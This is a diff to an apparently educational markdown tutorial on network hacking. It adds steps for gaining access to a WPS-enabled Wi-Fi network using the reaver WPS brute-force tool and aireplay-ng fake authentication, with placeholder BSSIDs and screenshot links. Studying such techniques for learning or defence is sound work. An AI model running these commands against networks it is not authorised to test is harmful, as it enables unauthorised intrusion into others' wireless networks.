@@ -40,8 +40,17 @@ To learn how malicious hackers hack a wired or wireless network and steal inform
 ## Gaining Access
 5. View all networks with WPS enabled:
 - wash --interface wlan0 ✅
-## Screenshot
+### Screenshot
 ![Wash command](../screenshots/wash-command.png)
+
+6. Associate with the network
+- reaver --bssid **AP bssid** --channel **AP channel** --interface wlan0 -vvv --no-associate
+
+- aireplay-ng --fakeauth 30 -a **AP bssid** -h **device mac** wlan0
+  ### Screenshot
+![Reaver](../screenshots/reaver.png)
+
+
 
 
 
